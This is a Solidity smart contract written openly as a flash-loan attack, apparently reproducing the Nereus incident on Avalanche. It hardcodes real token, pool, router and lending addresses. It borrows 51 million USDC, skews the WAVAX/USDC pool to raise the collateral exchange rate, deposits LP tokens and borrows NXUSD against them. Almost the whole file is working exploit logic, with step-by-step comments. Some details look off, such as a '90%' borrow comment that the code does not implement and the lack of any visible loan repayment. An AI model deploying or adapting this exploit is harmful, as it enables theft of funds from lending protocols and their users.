// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IJoePair is IERC20 {
  function mint(address to) external returns (uint256);

  function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data
  ) external;
}

interface ICauldronV2 {
  function updateExchangeRate() external returns (bool updated, uint256 rate);

  function exchangeRate() external view returns (uint256);

  function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);

  function addCollateral(
    address to,
    bool skim,
    uint256 share
  ) external;
}

interface ITraderJoeRouter {
  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );
}

interface IDegenBox {
  function setMasterContractApproval(
    address user,
    address masterContract,
    bool approved,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  function deposit(
    IERC20 token_,
    address from,
    address to,
    uint256 amount,
    uint256 share
  ) external payable returns (uint256 amountOut, uint256 shareOut);

  function withdraw(
    IERC20 token_,
    address from,
    address to,
    uint256 amount,
    uint256 share
  ) external returns (uint256 amountOut, uint256 shareOut);

  function balanceOf(address token, address account) external view returns (uint256);
}

interface IFlashLoaner {
  function flashLoanSimple(
    address receiverAddress,
    address asset,
    uint256 amount,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

contract NereusFlashLoanAttack {
  IERC20 usdc = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
  IERC20 nxusd = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);
  IERC20 wavax = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
  IJoePair wavaxusdc = IJoePair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
  IDegenBox degenbox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);
  ICauldronV2 cauldron = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
  address masterCauldron = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;
  ITraderJoeRouter router = ITraderJoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
  IFlashLoaner flashLoaner = IFlashLoaner(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

  function exploit() public {
    // Approve USDC and WAVAX on the router
    usdc.approve(address(router), type(uint256).max);
    wavax.approve(address(router), type(uint256).max);

    // Approve USDC for the flash loaner pool so it can make us repay the
    // flashloan
    usdc.approve(address(flashLoaner), type(uint256).max);

    // Approve WAVAX/USDC LP tokens for the DegenBox so it lets us deposit
    // to it
    wavaxusdc.approve(address(degenbox), type(uint256).max);

    // Allow the CauldronV2 master contract to make transactions (i.e decisions)
    // for us
    degenbox.setMasterContractApproval(address(this), masterCauldron, true, 0, 0, 0);

    // Now, lets get the flash loan for 51 million USDC
    flashLoaner.flashLoanSimple(address(this), address(usdc), 51000000e6, '', 0);
  }

  function executeOperation(
    address,
    uint256,
    uint256,
    address,
    bytes calldata
  ) public returns (bool) {
    address[] memory path = new address[](2);
    path[0] = address(usdc);
    path[1] = address(wavax);

    // Step 1: Swap 280,000 USDC for as much WAVAX as possible
    router.swapExactTokensForTokens(280000e6, 1, path, address(this), block.timestamp * 5);

    // Step 2: Add 260,000 USDC and as much WAVAX (in this case, assume 20000
    // WAVAX) into the WAVAX/USDC LP pool
    router.addLiquidity(
      address(usdc),
      address(wavax),
      260000e6,
      20000 ether,
      1,
      1,
      address(this),
      block.timestamp * 5
    );

    // Step 3: Swap the remaining flashloaned USDC for as much WAVAX as possible
    router.swapExactTokensForTokens(
      51000000e6 - 280000e6 - 260000e6, // Remaining USDC
      1,
      path,
      address(this),
      block.timestamp * 5
    );

    // Step 4: Update the exchangeRate that the cauldron sees when attempting
    // NXUSD for the collateral asset WAVAX/USDC Joe LP Pair
    (bool updated, uint256 rate) = cauldron.updateExchangeRate();

    require(updated, 'Exchange rate was not updated');

    // Step 5: Provide all our WAVAX/USDC LP Tokens up as collateral
    uint256 amountLP = wavaxusdc.balanceOf(address(this));

    degenbox.deposit(IERC20(wavaxusdc), address(this), address(this), amountLP, amountLP);
    cauldron.addCollateral(address(this), false, amountLP);

    // Step 6: Calculate the amount we can borrow, and borrow 90% of that amount
    uint256 amountToBorrow = amountLP / rate;
    cauldron.borrow(address(this), amountToBorrow);

    // Step 7: Actually get our tokens. We borrowed them, but we need to
    // withdraw them now
    uint256 borrowedBalance = degenbox.balanceOf(address(nxusd), address(this));
    degenbox.withdraw(nxusd, address(this), address(this), borrowedBalance, borrowedBalance);

    return true;
  }

  function test() public view returns (uint256) {
    return nxusd.balanceOf(address(this));
  }
}
